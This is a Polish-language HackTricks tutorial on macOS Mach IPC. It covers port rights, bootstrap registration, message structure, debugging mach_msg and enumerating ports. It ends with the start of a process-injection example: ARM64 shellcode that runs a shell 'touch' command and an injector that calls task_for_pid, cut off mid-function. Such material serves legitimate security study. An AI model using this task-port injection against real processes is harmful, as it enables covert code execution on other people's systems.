# macOS IPC - Komunikacja międzyprocesowa

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Komunikacja Mach za pomocą portów

### Podstawowe informacje

Mach używa **zadań** jako **najmniejszej jednostki** do dzielenia zasobów, a każde zadanie może zawierać **wiele wątków**. Te **zadania i wątki są mapowane 1:1 na procesy i wątki POSIX**.

Komunikacja między zadaniami odbywa się za pomocą Mach Inter-Process Communication (IPC), wykorzystując jednokierunkowe kanały komunikacyjne. **Wiadomości są przesyłane między portami**, które działają jak **kolejki wiadomości** zarządzane przez jądro.

**Port** jest **podstawowym** elementem Mach IPC. Może być używany do **wysyłania i odbierania wiadomości**.

Każdy proces ma **tabelę IPC**, w której można znaleźć **porty mach procesu**. Nazwa portu mach to właściwie liczba (wskaźnik do obiektu jądra).

Proces może również wysłać nazwę portu z pewnymi uprawnieniami **do innego zadania**, a jądro spowoduje, że ta pozycja pojawi się w **tabeli IPC innego zadania**.

### Prawa portu

Prawa portu, które określają, jakie operacje może wykonać zadanie, są kluczowe dla tej komunikacji. Możliwe **prawa portu** to ([definicje stąd](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Prawo odbierania**, które pozwala na odbieranie wiadomości wysłanych do portu. Porty Mach są kolejkami MPSC (wielu producentów, jeden konsument), co oznacza, że może istnieć tylko **jedno prawo odbierania dla każdego portu** w całym systemie (w przeciwieństwie do potoków, gdzie wiele procesów może trzymać deskryptory plików do końca odczytu jednego potoku).
* **Zadanie z prawem odbierania** może odbierać wiadomości i **tworzyć prawa wysyłania**, pozwalając na wysyłanie wiadomości. Początkowo tylko **własne zadanie ma prawo odbierania nad swoim portem**.
* Jeśli właściciel prawa odbierania **umiera** lub je zabija, **prawo wysyłania staje się bezużyteczne (martwa nazwa).**
* **Prawo wysyłania**, które pozwala na wysyłanie wiadomości do portu.
* Prawo wysyłania można **klonować**, więc zadanie posiadające prawo wysyłania może sklonować prawo i **przekazać je trzeciemu zadaniu**.
* Zauważ, że **prawa portu** mogą również być **przekazywane** za pomocą wiadomości Mac.
* **Prawo wysłania raz**, które pozwala na wysłanie jednej wiadomości do portu, a następnie zniknie.
* To prawo **nie** może być **sklonowane**, ale można je **przenieść**.
* **Prawo zestawu portów**, które oznacza _zestaw portów_ zamiast pojedynczego portu. Usunięcie wiadomości z zestawu portów usuwa wiadomość z jednego z zawartych portów. Zestawy portów mogą być używane do nasłuchiwania na kilku portach jednocześnie, podobnie jak `select`/`poll`/`epoll`/`kqueue` w Unix.
* **Martwa nazwa**, która nie jest faktycznym prawem portu, ale jedynie miejscem. Gdy port zostanie zniszczony, wszystkie istniejące prawa portu do portu zamieniają się w martwe nazwy.

**Zadania mogą przekazywać prawa WYSYŁANIA innym**, umożliwiając im wysyłanie wiadomości z powrotem. **Prawa WYSYŁANIA można również klonować, więc zadanie może zduplikować i przekazać prawo trzeciemu zadaniu**. To, w połączeniu z pośrednim procesem znanym jako **serwer rozruchowy**, umożliwia efektywną komunikację między zadaniami.

### Porty plików

Porty plików pozwalają na zamknięcie deskryptorów plików w portach Mac (za pomocą praw portów Mach). Możliwe jest utworzenie `fileport` z danego FD za pomocą `fileport_makeport` i utworzenie FD z fileport za pomocą `fileport_makefd`.

### Ustanowienie komunikacji

Jak wspomniano wcześniej, możliwe jest wysyłanie praw za pomocą wiadomości Mach, jednakże **nie można wysłać prawa bez posiadania już prawa** do wysłania wiadomości Mach. Jak więc ustanowić pierwszą komunikację?

W tym celu zaangażowany jest **serwer rozruchowy** (**launchd** w systemie Mac), ponieważ **każdy może uzyskać prawo WYSYŁANIA do serwera rozruchowego**, możliwe jest poproszenie go o prawo do wysłania wiadomości do innego procesu:

1. Zadanie **A** tworzy **nowy port**, uzyskując **prawo ODBIERANIA** nad nim.
2. Zadanie **A**, będąc posiadaczem prawa ODBIERANIA, **generuje prawo WYSYŁANIA dla portu**.
3. Zadanie **A** nawiązuje **połączenie** z **serwerem rozruchowym** i **wysyła mu prawo WYSYŁANIA** dla portu, które wygenerowało na początku.
* Pamiętaj, że każdy może uzyskać prawo WYSYŁANIA do serwera rozruchowego.
4. Zadanie A wysyła wiadomość `bootstrap_register` do serwera rozruchowego, aby **powiązać dany port z nazwą** jak `com.apple.taska`
5. Zadanie **B** współdziała z **serwerem rozruchowym**, aby wykonać **wyszukiwanie rozruchowe dla nazwy usługi** (`bootstrap_lookup`). Aby serwer rozruchowy mógł odpowiedzieć, zadanie B wyśle mu **prawo WYSYŁANIA do portu, które wcześniej utworzyło** wewnątrz wiadomości wyszukiwania. Jeśli wyszukiwanie jest udane, **serwer duplikuje prawo WYSYŁANIA** otrzymane od zadania A i **przekazuje je zadaniu B**.
* Pamiętaj, że każdy może uzyskać prawo WYSYŁANIA do serwera rozruchowego.
6. Dzięki temu prawu WYSYŁANIA, **Zadanie B** jest zdolne do **wysłania** **wiadomości** **do Zadania A**.
7. Dla komunikacji dwukierunkowej zazwyczaj zadanie **B** generuje nowy port z prawem **ODBIERANIA** i prawem **WYSYŁANIA**, i przekazuje **prawo WYSYŁANIA do Zadania A**, aby mogło wysyłać wiadomości do ZADANIA B (komunikacja dwukierunkowa).

Serwer rozruchowy **nie może uwierzytelnić** nazwy usługi twierdzonej przez zadanie. Oznacza to, że **zadanie** potencjalnie **mogłoby podszywać się pod dowolne zadanie systemowe**, na przykład fałszywie **twierdząc nazwę usługi autoryzacji**, a następnie zatwierdzając każde żądanie.

Następnie Apple przechowuje **nazwy usług dostarczanych przez system** w bezpiecznych plikach konfiguracyjnych, znajdujących się w chronionych katalogach SIP: `/System/Library/LaunchDaemons` i `/System/Library/LaunchAgents`. Obok każdej nazwy usługi przechowywany jest również **powiązany plik binarny**. Serwer rozruchowy utworzy i będzie trzymał **prawo ODBIERANIA dla każdej z tych nazw usług**.

Dla tych predefiniowanych usług, **proces wyszukiwania różni się nieco**. Gdy nazwa usługi jest wyszukiwana, launchd uruchamia usługę dynamicznie. Nowy schemat postępowania wygląda następująco:

* Zadanie **B** inicjuje **wyszukiwanie rozruchowe** dla nazwy usługi.
* **launchd** sprawdza, czy zadanie jest uruchomione, i jeśli nie, **uruchamia** je.
* Zadanie **A** (usługa) wykonuje **rejestrację rozruchową** (`bootstrap_check_in()`). Tutaj **serwer rozruchowy tworzy prawo WYSYŁANIA, zatrzymuje je i przekazuje prawo ODBIERANIA do Zadania A**.
* launchd duplikuje **prawo WYSYŁANIA i wysyła je do Zadania B**.
* Zadanie **B** generuje nowy port z prawem **ODBIERANIA** i prawem **WYSYŁANIA**, i przekazuje **prawo WYSYŁANIA do Zadania A** (usługi), aby mogło wysyłać wiadomości do ZADANIA B (komunikacja dwukierunkowa).

Jednak ten proces dotyczy tylko predefiniowanych zadań systemowych. Zadania spoza systemu wciąż działają zgodnie z opisem pierwotnym, co potencjalnie może pozwolić na podszywanie się.

{% hint style="danger" %}
Dlatego launchd nie powinien nigdy ulec awarii, w przeciwnym razie cały system ulegnie awarii.
{% endhint %}
### Wiadomość Mach

[Znajdź więcej informacji tutaj](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Funkcja `mach_msg`, będąca w zasadzie wywołaniem systemowym, jest wykorzystywana do wysyłania i odbierania wiadomości Mach. Funkcja wymaga, aby wiadomość została wysłana jako argument początkowy. Wiadomość ta musi rozpoczynać się od struktury `mach_msg_header_t`, po której następuje właściwa zawartość wiadomości. Struktura ta jest zdefiniowana następująco:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Procesy posiadające _**prawo odbierania**_ mogą odbierać wiadomości na porcie Mach. Z kolei **nadawcy** otrzymują _**prawo wysyłania**_ lub _**prawo wysłania raz**_. Prawo wysłania raz służy wyłącznie do wysłania pojedynczej wiadomości, po czym staje się nieważne.

Początkowe pole **`msgh_bits`** to mapa bitowa:

* Pierwszy bit (najbardziej znaczący) służy do wskazania, czy wiadomość jest złożona (więcej informacji poniżej)
* 3. i 4. bit są używane przez jądro systemu
* **5 najmniej znaczących bitów 2. bajtu** mogą być używane do **bonu**: innego rodzaju portu do wysyłania kombinacji klucz/wartość.
* **5 najmniej znaczących bitów 3. bajtu** mogą być używane do **portu lokalnego**
* **5 najmniej znaczących bitów 4. bajtu** mogą być używane do **portu zdalnego**

Typy, które można określić w bonie, portach lokalnych i zdalnych to (z [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Na przykład `MACH_MSG_TYPE_MAKE_SEND_ONCE` można użyć do **wskazania**, że **prawo do jednorazowego wysłania** powinno być wygenerowane i przesłane dla tego portu. Można także określić `MACH_PORT_NULL`, aby uniemożliwić odbiorcy odpowiedź.

Aby osiągnąć łatwą **komunikację dwukierunkową**, proces może określić **port mach** w nagłówku mach o nazwie _port odpowiedzi_ (**`msgh_local_port`**), gdzie **odbiorca** wiadomości może **wysłać odpowiedź** na tę wiadomość.

{% hint style="success" %}
Zauważ, że tego rodzaju komunikacja dwukierunkowa jest używana w wiadomościach XPC, które oczekują odpowiedzi (`xpc_connection_send_message_with_reply` i `xpc_connection_send_message_with_reply_sync`). Ale **zazwyczaj tworzone są różne porty**, jak wyjaśniono wcześniej, aby utworzyć komunikację dwukierunkową.
{% endhint %}

Pozostałe pola nagłówka wiadomości to:

- `msgh_size`: rozmiar całego pakietu.
- `msgh_remote_port`: port, na który wysłana jest ta wiadomość.
- `msgh_voucher_port`: [vouchery mach](https://robert.sesek.com/2023/6/mach\_vouchers.html).
- `msgh_id`: ID tej wiadomości, który jest interpretowany przez odbiorcę.

{% hint style="danger" %}
Zauważ, że **wiadomości mach są wysyłane przez `port mach`**, który jest kanałem komunikacji **jednego odbiorcy** i **wielu nadawców** wbudowanym w jądro mach. **Wiele procesów** może **wysyłać wiadomości** do portu mach, ale w dowolnym momencie tylko **jeden proces może je czytać**.
{% endhint %}

Wiadomości są następnie tworzone przez nagłówek **`mach_msg_header_t`**, a następnie **ciało** i **trailer** (jeśli jest) oraz może przyznać uprawnienie do odpowiedzi. W tych przypadkach jądro musi tylko przekazać wiadomość z jednego zadania do drugiego.

**Trailer** to **informacje dodane do wiadomości przez jądro** (nie można ich ustawić przez użytkownika), które można zażądać podczas odbierania wiadomości za pomocą flag `MACH_RCV_TRAILER_<trailer_opt>` (istnieje różne informacje, które można zażądać).

#### Skomplikowane Wiadomości

Jednak istnieją inne bardziej **skomplikowane** wiadomości, takie jak te przekazujące dodatkowe prawa portów lub udostępniające pamięć, gdzie jądro musi również przesłać te obiekty do odbiorcy. W tych przypadkach najbardziej znaczący bit nagłówka `msgh_bits` jest ustawiony.

Możliwe deskryptory do przekazania są zdefiniowane w [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
W 32-bitowej architekturze wszystkie deskryptory mają 12 bajtów, a typ deskryptora znajduje się w jedenastym. W 64-bitowej architekturze rozmiary są zróżnicowane.

{% hint style="danger" %}
Jądro skopiuje deskryptory z jednego zadania do drugiego, ale najpierw **tworzy kopię w pamięci jądra**. Ta technika, znana jako "Feng Shui", została wykorzystana w kilku exploitach do zmuszenia **jądra do kopiowania danych w swojej pamięci**, umożliwiając procesowi wysłanie deskryptorów do samego siebie. Następnie proces może odebrać wiadomości (jądro je zwolni).

Możliwe jest również **przesłanie praw portu do podatnego procesu**, a prawa portu pojawią się w procesie (nawet jeśli nie są obsługiwane).
{% endhint %}

### API portów Mac

Zauważ, że porty są powiązane z przestrzenią nazw zadania, więc aby utworzyć lub wyszukać port, należy również sprawdzić przestrzeń nazw zadania (więcej w `mach/mach_port.h`):

* **`mach_port_allocate` | `mach_port_construct`**: **Utwórz** port.
* `mach_port_allocate` może również utworzyć **zbiór portów**: prawo odbioru w grupie portów. Za każdym razem, gdy zostanie odebrana wiadomość, wskazane jest źródło portu.
* `mach_port_allocate_name`: Zmień nazwę portu (domyślnie 32-bitowa liczba całkowita)
* `mach_port_names`: Pobierz nazwy portów z docelowego
* `mach_port_type`: Pobierz prawa zadania do nazwy
* `mach_port_rename`: Zmień nazwę portu (jak dup2 dla FD)
* `mach_port_allocate`: Przydziel nowy ODBIÓR, ZESTAW_PORTÓW lub DEAD_NAME
* `mach_port_insert_right`: Utwórz nowe prawo w porcie, w którym masz ODBIÓR
* `mach_port_...`
* **`mach_msg`** | **`mach_msg_overwrite`**: Funkcje używane do **wysyłania i odbierania wiadomości mach**. Wersja nadpisania pozwala określić inny bufor do odbioru wiadomości (w przeciwnym razie zostanie on ponownie użyty).

### Debugowanie mach\_msg

Ponieważ funkcje **`mach_msg`** i **`mach_msg_overwrite`** są używane do wysyłania i odbierania wiadomości, ustawienie punktu przerwania na nich pozwoli na zbadanie wysłanych i odebranych wiadomości.

Na przykład rozpocznij debugowanie dowolnej aplikacji, którą można debugować, ponieważ załaduje **`libSystem.B, która będzie używać tej funkcji**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Punkt przerwania 1: gdzie = libsystem_kernel.dylib`mach_msg, adres = 0x00000001803f6c20
<strong>(lldb) r
</strong>Proces 71019 uruchomiony: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Proces 71019 zatrzymany
* wątek #1, kolejka = 'com.apple.main-thread', powód zatrzymania = punkt przerwania 1.1
ramka #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Cel 0: (SandboxedShellApp) zatrzymany.
<strong>(lldb) bt
</strong>* wątek #1, kolejka = 'com.apple.main-thread', powód zatrzymania = punkt przerwania 1.1
* ramka #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
ramka #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
ramka #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
ramka #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
ramka #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
ramka #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
ramka #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
ramka #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
ramka #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
ramka #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

Aby uzyskać argumenty **`mach_msg`**, sprawdź rejestry. Oto argumenty (z [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Pobierz wartości z rejestrów:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Sprawdź nagłówek wiadomości, sprawdzając pierwszy argument:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Ten rodzaj `mach_msg_bits_t` jest bardzo powszechny, aby umożliwić odpowiedź.



### Wylicz porty
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
Nazwa to domyślna nazwa nadana portowi (sprawdź, jak zwiększa się ona w pierwszych 3 bajtach). **`ipc-object`** to zasłonięty unikalny identyfikator portu.\
Zauważ również, jak porty z tylko prawem **`send`** identyfikują właściciela (nazwa portu + pid).\
Zauważ także użycie **`+`** do wskazania innych zadań połączonych z tym samym portem.

Można również użyć [**procesxp**](https://www.newosxbook.com/tools/procexp.html), aby zobaczyć zarejestrowane nazwy usług (z wyłączonym SIP z powodu potrzeby `com.apple.system-task-port`):
```
procesp 1 ports
```
Możesz zainstalować to narzędzie w iOS, pobierając je z [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Przykład kodu

Zauważ, jak **nadawca** **przydziela** port, tworzy **prawo wysyłania** dla nazwy `org.darlinghq.example` i wysyła je do **serwera rozruchowego**, podczas gdy nadawca poprosił o **prawo wysyłania** tej nazwy i użył go do **wysłania wiadomości**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### Przywilejowane porty

* **Port hosta**: Jeśli proces ma uprawnienie **Wysyłanie** do tego portu, może uzyskać **informacje** o **systemie** (np. `host_processor_info`).
* **Port hosta z uprawnieniami roota**: Proces z prawem **Wysyłania** do tego portu może wykonywać **uprzywilejowane akcje**, takie jak ładowanie rozszerzenia jądra. **Proces musi być rootem**, aby uzyskać to uprawnienie.
* Ponadto, aby wywołać API **`kext_request`**, konieczne jest posiadanie innych uprawnień **`com.apple.private.kext*`**, które są udzielane tylko binariom Apple.
* **Port nazwy zadania**: Nieuprzywilejowana wersja portu zadania. Odwołuje się do zadania, ale nie pozwala na jego kontrolę. Jedyną dostępną przez niego rzeczą wydaje się być `task_info()`.
* **Port zadania** (znany również jako port jądra)**:** Posiadając uprawnienie Wysyłania do tego portu, możliwe jest kontrolowanie zadania (odczyt/zapis pamięci, tworzenie wątków...).
* Wywołaj `mach_task_self()` aby **uzyskać nazwę** tego portu dla zadania wywołującego. Ten port jest dziedziczony tylko podczas **`exec()`**; nowe zadanie utworzone za pomocą `fork()` otrzymuje nowy port zadania (jako szczególny przypadek, zadanie również otrzymuje nowy port zadania po `exec()` w binarnym pliku suid). Jedynym sposobem na uruchomienie zadania i uzyskanie jego portu jest wykonanie ["tancerki z portami"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) podczas `fork()`.
* Oto ograniczenia dostępu do portu (z `macos_task_policy` z binariów `AppleMobileFileIntegrity`):
* Jeśli aplikacja ma uprawnienie **`com.apple.security.get-task-allow`**, procesy od **tego samego użytkownika mogą uzyskać dostęp do portu zadania** (zazwyczaj dodawane przez Xcode do debugowania). Proces notaryzacji nie zezwoli na to w wersjach produkcyjnych.
* Aplikacje z uprawnieniem **`com.apple.system-task-ports`** mogą uzyskać **port zadania dla dowolnego** procesu, z wyjątkiem jądra. W starszych wersjach nazywane to było **`task_for_pid-allow`**. Udzielane jest to tylko aplikacjom Apple.
* **Root może uzyskać dostęp do portów zadań** aplikacji **nie** skompilowanych z **zabezpieczonym** środowiskiem wykonawczym (i nie pochodzących od Apple).

### Wstrzykiwanie kodu Shell w wątek za pomocą portu zadania

Możesz pobrać kod Shell z:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %} {% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Skompiluj** poprzedni program i dodaj **uprawnienia** umożliwiające wstrzykiwanie kodu z tym samym użytkownikiem (jeśli nie, będziesz musiał użyć **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
